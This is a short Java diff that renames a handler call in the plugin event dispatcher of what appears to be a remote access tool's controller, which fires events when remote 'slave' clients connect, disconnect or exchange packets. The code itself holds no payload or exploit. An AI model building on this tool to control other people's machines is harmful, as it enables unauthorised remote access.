@@ -14,7 +14,7 @@ public class PluginEventHandler {
 	public static void onPacket(AbstractSlave slave, byte header) {
 		OnPacketEvent e = new OnPacketEvent(RATObjectFormat.format(slave), new Packet(header));
 		
-		for (Event event : Plugins.getHandler().getEvents(EventType.EVENT_CLIENT_PACKET_RECEIVED)) {
+		for (Event event : Event.getHandler().getEvents(EventType.EVENT_CLIENT_PACKET_RECEIVED)) {
 			event.perform(e);
 		}
 	}
@@ -22,7 +22,7 @@ public class PluginEventHandler {
 	public static void onConnect(AbstractSlave slave) {
 		OnConnectEvent e = new OnConnectEvent(RATObjectFormat.format(slave));
 		
-		for (Event event : Plugins.getHandler().getEvents(EventType.EVENT_CLIENT_CONNECT)) {
+		for (Event event : Event.getHandler().getEvents(EventType.EVENT_CLIENT_CONNECT)) {
 			event.perform(e);
 		}
 	}
@@ -30,7 +30,7 @@ public class PluginEventHandler {
 	public static void onDisconnect(AbstractSlave slave) {
 		OnDisconnectEvent e = new OnDisconnectEvent(RATObjectFormat.format(slave));
 		
-		for (Event event : Plugins.getHandler().getEvents(EventType.EVENT_CLIENT_DISCONNECT)) {
+		for (Event event : Event.getHandler().getEvents(EventType.EVENT_CLIENT_DISCONNECT)) {
 			event.perform(e);
 		}
 	}
@@ -38,7 +38,7 @@ public class PluginEventHandler {
 	public static void onSendPacket(byte header, AbstractSlave slave) {
 		OnSendPacketEvent e = new OnSendPacketEvent(new Packet(header), RATObjectFormat.format(slave));
 		
-		for (Event event : Plugins.getHandler().getEvents(EventType.EVENT_SERVER_PACKET_SEND)) {
+		for (Event event : Event.getHandler().getEvents(EventType.EVENT_SERVER_PACKET_SEND)) {
 			event.perform(e);
 		}
 	}
